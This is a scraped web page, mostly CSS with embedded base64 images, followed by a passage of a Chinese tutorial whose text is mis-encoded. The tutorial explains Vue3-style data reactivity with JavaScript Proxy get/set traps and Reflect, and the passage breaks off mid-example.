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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨Vue3ä¸­ï¼Œç”¨Proxyä»£ç†ä»£æ›¿äº†åŸæœ‰çš„<code>Object.defineProperty</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ç”¨æ‰‹å†™æ•°æ®å“åº”çš„æ–¹å¼ï¼Œè®©å¤§å®¶å†æ¬¡æ·±åˆ»çš„ç†è§£ä¸€ä¸‹Proxyç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ ·çš„â€œMagicâ€ ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€å…ˆææ‡‚ï¼šä»€ä¹ˆæ˜¯ã€Œæ•°æ®å“åº”å¼ã€ï¼Ÿ</h2>
<p>ç®€å•è¯´ï¼š<strong>å½“æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé¡µé¢ï¼ˆæˆ–é€»è¾‘ï¼‰è‡ªåŠ¨åšå‡ºååº”ï¼Œä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»æ›´æ–°</strong>ã€‚</p>
<p>ä¸¾ä¸ªç”Ÿæ´»ä¾‹å­ï¼š</p>
<ul>
<li>ä½ åœ¨è´­ç‰© APP ä¸ŠæŠŠå•†å“åŠ å…¥è´­ç‰©è½¦ï¼ˆæ•°æ®å˜åŒ–ï¼šè´­ç‰©è½¦åˆ—è¡¨æ–°å¢å•†å“ï¼‰</li>
<li>è´­ç‰©è½¦å›¾æ ‡ä¸Šçš„æ•°å­—è‡ªåŠ¨ä» 0 å˜æˆ 1ï¼ˆé¡µé¢è‡ªåŠ¨ååº”ï¼‰</li>
<li>è¿™ä¸ª â€œæ•°æ®å˜ â†’ é¡µé¢è‡ªåŠ¨å˜â€ çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æ•°æ®å“åº”å¼ã€‚</li>
</ul>
<p>åœ¨ä»£ç é‡Œï¼Œæ²¡æœ‰å“åº”å¼æ—¶ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨åšæ‰€æœ‰æ“ä½œï¼›æœ‰äº†å“åº”å¼ï¼Œæ•°æ®å˜åŒ–ä¼š â€œè‡ªåŠ¨è§¦å‘â€ åç»­é€»è¾‘ï¼Œè¿™å°±æ˜¯ Proxy çš„æ ¸å¿ƒä»·å€¼ã€‚ å¤§å®¶å‘ç°äº†å—ï¼Œç‰¹ç‚¹å°±æ˜¯ï¼š<strong>æ£€æµ‹æ•°æ®å˜åŒ–-&gt;è§¦å‘æ•°æ®æ›´æ–°-&gt;è§†å›¾æ¸²æŸ“</strong> è¿™ä¸‰ä¸ªæ­¥éª¤ã€‚</p>
<h2 data-id="heading-1">äºŒã€å…ˆè®¤è¯†ä¸¤ä¸ªæ ¸å¿ƒå·¥å…·ï¼šProxy å’Œ Reflect</h2>
<p>è¿™ä¸¤ä¸ªæ˜¯ ES6 æ–°å¢çš„ APIï¼Œä¹Ÿæ˜¯å®ç°å“åº”å¼çš„åŸºç¡€ï¼Œæˆ‘ä»¬å…ˆé€ä¸ªææ‡‚ï¼Œä¸ç€æ€¥ç»„åˆã€‚</p>
<h3 data-id="heading-2">Proxyï¼šç»™å¯¹è±¡åŠ ä¸€ä¸ª â€œç›‘å¬å™¨ / æ‹¦æˆªå™¨â€</h3>
<p>ä½ å¯ä»¥æŠŠÂ <code>Proxy</code>Â ç†è§£ä¸ºï¼š<strong>ç»™æ™®é€šå¯¹è±¡å¥—äº†ä¸€ä¸ª â€œä¿æŠ¤å£³â€ï¼Œä»»ä½•å¯¹å¯¹è±¡çš„ã€Œè¯»å–ã€ã€Œä¿®æ”¹ã€æ“ä½œï¼Œéƒ½å¿…é¡»å…ˆç»è¿‡è¿™ä¸ªä¿æŠ¤å£³ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å£³é‡Œç›‘å¬ / æ‹¦æˆªè¿™äº›æ“ä½œ</strong>ã€‚</p>
<h4 data-id="heading-3">Proxy çš„åŸºæœ¬è¯­æ³•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>
};

<span class="hljs-comment">//  åˆ›å»º Proxy ä»£ç†å¯¹è±¡ï¼ˆç»™ person å¥—ä¸Šâ€œç›‘å¬å™¨â€ï¼‰</span>
<span class="hljs-keyword">const</span> proxyPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, {
  <span class="hljs-comment">// ã€æ‹¦æˆªè¯»å–æ“ä½œã€‘ï¼šå½“è¯»å– proxyPerson çš„å±æ€§æ—¶ï¼Œè‡ªåŠ¨è§¦å‘è¿™ä¸ª get æ–¹æ³•</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
    <span class="hljs-comment">// targetï¼šè¢«ä»£ç†çš„åŸå§‹å¯¹è±¡ï¼ˆè¿™é‡Œå°±æ˜¯ personï¼‰</span>
    <span class="hljs-comment">// propertyï¼šå½“å‰è¦è¯»å–çš„å±æ€§åï¼ˆæ¯”å¦‚è¯»å– proxyPerson.name æ—¶ï¼Œproperty å°±æ˜¯ "name"ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººè¯»å–äº† <span class="hljs-subst">${property}</span> å±æ€§`</span>);
    <span class="hljs-comment">// è¿”å›å±æ€§å€¼ï¼ˆä¸è®©è¯»å–æ“ä½œè¢«æ‹¦æˆªåâ€œä¸¢å¤±â€ï¼‰</span>
    <span class="hljs-keyword">return</span> target[property];
  },

  <span class="hljs-comment">// ã€æ‹¦æˆªä¿®æ”¹æ“ä½œã€‘ï¼šå½“ä¿®æ”¹ proxyPerson çš„å±æ€§æ—¶ï¼Œè‡ªåŠ¨è§¦å‘è¿™ä¸ª set æ–¹æ³•</span>
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
    <span class="hljs-comment">// targetï¼šè¢«ä»£ç†çš„åŸå§‹å¯¹è±¡ï¼ˆpersonï¼‰</span>
    <span class="hljs-comment">// propertyï¼šå½“å‰è¦ä¿®æ”¹çš„å±æ€§åï¼ˆæ¯”å¦‚ä¿®æ”¹ proxyPerson.age æ—¶ï¼Œproperty å°±æ˜¯ "age"ï¼‰</span>
    <span class="hljs-comment">// valueï¼šå½“å‰è¦ä¿®æ”¹çš„æ–°å€¼ï¼ˆæ¯”å¦‚ proxyPerson.age = 21ï¼Œvalue å°±æ˜¯ 21ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººä¿®æ”¹äº† <span class="hljs-subst">${property}</span> å±æ€§ï¼Œæ–°å€¼æ˜¯ <span class="hljs-subst">${value}</span>`</span>);
    <span class="hljs-comment">// æ‰§è¡ŒçœŸæ­£çš„ä¿®æ”¹æ“ä½œï¼ˆæŠŠæ–°å€¼èµ‹ç»™åŸå§‹å¯¹è±¡çš„å¯¹åº”å±æ€§ï¼‰</span>
    target[property] = value;
    <span class="hljs-comment">// æ³¨æ„ï¼šset æ–¹æ³•æœ€å¥½è¿”å› trueï¼Œè¡¨ç¤ºä¿®æ”¹æˆåŠŸï¼ˆä¿æŒåŸç”Ÿè¡Œä¸ºï¼‰</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
});
</code></pre>
<h4 data-id="heading-4">æµ‹è¯•ä¸€ä¸‹ Proxy çš„æ•ˆæœ</h4>
<p>æˆ‘ä»¬ä¸ç›´æ¥æ“ä½œåŸå§‹å¯¹è±¡Â <code>person</code>ï¼Œè€Œæ˜¯æ“ä½œä»£ç†å¯¹è±¡Â <code>proxyPerson</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyPerson.<span class="hljs-property">name</span>);  <span class="hljs-comment">//æŸ¥çœ‹ä»£ç†ånameå±æ€§çš„ä¸‹çš„å€¼</span>
proxyPerson.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>;           <span class="hljs-comment">//æ›´æ”¹å±æ€§ageçš„å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyPerson.<span class="hljs-property">age</span>);   <span class="hljs-comment">//è¾“å‡ºæ›´æ”¹å±æ€§ageåçš„å€¼</span>

</code></pre>
<p>ä½ å°†ä¼šçœ‹åˆ°</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff38ac6025ab4331bd50eca25b20da16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWF4a2lt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619017&amp;x-signature=0G6LmtoL4nZIAFwLxZw%2B9LsxVBw%3D" alt="image.png" width="50%" loading="lazy"/></p>
<p><strong>å¼ºè°ƒ</strong></p>
<ul>
<li>ä»£ç†å¯¹è±¡ï¼ˆ<code>proxyPerson</code>ï¼‰å’ŒåŸå§‹å¯¹è±¡ï¼ˆ<code>person</code>ï¼‰æ˜¯ â€œå…³è”â€ çš„ï¼Œä½†ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡</li>
<li>å¿…é¡»æ“ä½œ<strong>ä»£ç†å¯¹è±¡</strong>æ‰ä¼šè§¦å‘æ‹¦æˆªå™¨ï¼Œç›´æ¥æ“ä½œåŸå§‹å¯¹è±¡ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼š</li>
</ul>
<p>åƒä¸‹é¢è¿™æ ·æ˜¯<strong>æ— æ•ˆçš„</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5c8a109a0994cf692c4f54b1562b2c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWF4a2lt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619017&amp;x-signature=oGa64MDSR4oQEctM28fCUTc3wj4%3D" alt="image.png" width="50%" loading="lazy"/></p>
<h3 data-id="heading-5">Â Reflectï¼šæ›´ â€œå‹å¥½â€ çš„å¯¹è±¡æ“ä½œå·¥å…·</h3>
<p>åˆšæ‰æˆ‘ä»¬åœ¨ Proxy çš„ get/set é‡Œï¼Œç”¨äº†Â <code>target[property]</code>Â è¯»å–ã€<code>target[property] = value</code>Â ä¿®æ”¹ï¼Œè¿™æ˜¯æ™®é€šå†™æ³•ï¼Œä½†æœ‰ä¸€äº›å‘ï¼ˆæ¯”å¦‚ç»§æ‰¿åœºæ™¯ã€ä¸¥æ ¼æ¨¡å¼ä¸‹å¯èƒ½å‡ºé”™ï¼‰ã€‚</p>
<p>ES6 æä¾›äº†Â <code>Reflect</code>ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯ï¼š<strong>ç”¨ â€œæ›´æ ‡å‡†ã€æ›´å®‰å…¨â€ çš„æ–¹å¼ï¼Œæ‰§è¡Œå¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆè¯»å–ã€ä¿®æ”¹ç­‰ï¼‰ï¼Œå’Œ Proxy æ˜¯ â€œæœ€ä½³æ­æ¡£â€</strong> ã€‚</p>
<h4 data-id="heading-6">Reflect çš„æ ¸å¿ƒç”¨æ³•ï¼ˆå’Œ Proxy å¯¹åº”ï¼‰</h4>
<p><code>Reflect</code>Â æ˜¯ä¸€ä¸ªå†…ç½®å¯¹è±¡ï¼Œä¸èƒ½å®ä¾‹åŒ–ï¼Œç›´æ¥è°ƒç”¨å®ƒçš„é™æ€æ–¹æ³•å³å¯ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯Â <code>Reflect.get</code>Â å’ŒÂ <code>Reflect.set</code>ï¼Œå¯¹åº”å¯¹è±¡çš„ â€œè¯»å–â€ å’Œ â€œä¿®æ”¹â€ï¼š</p>




















<table><thead><tr><th>æ™®é€šå¯¹è±¡æ“ä½œ</th><th>Reflect å¯¹åº”æ“ä½œ</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>target[property]</td><td>Reflect.get(target, property)</td><td>è¯»å–å¯¹è±¡çš„æŸä¸ªå±æ€§å€¼</td></tr><tr><td>target[property] = value</td><td>Reflect.set(target, property, value)</td><td>ä¿®æ”¹å¯¹è±¡çš„æŸä¸ªå±æ€§å€¼</td></tr></tbody></table>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> };

<span class="hljs-keyword">const</span> proxyPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººè¯»å–äº† <span class="hljs-subst">${property}</span> å±æ€§`</span>);
    <span class="hljs-comment">// ç”¨ Reflect.get ä»£æ›¿ target[property]</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property);
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
